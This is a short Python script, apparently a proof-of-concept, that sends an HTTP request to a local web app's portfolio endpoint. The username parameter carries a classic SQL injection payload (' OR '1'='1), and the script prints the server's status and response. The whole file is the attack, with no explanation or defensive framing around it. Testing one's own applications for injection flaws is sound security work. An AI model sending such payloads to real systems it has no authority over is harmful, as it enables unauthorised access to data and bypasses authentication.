import requests

url = "http://127.0.0.1:8000/portfolio?username=secops' OR '1'='1"

r = requests.get(url)
print(f"[+] Status: {r.status_code}")
print(f"[+] Response: {r.text}")
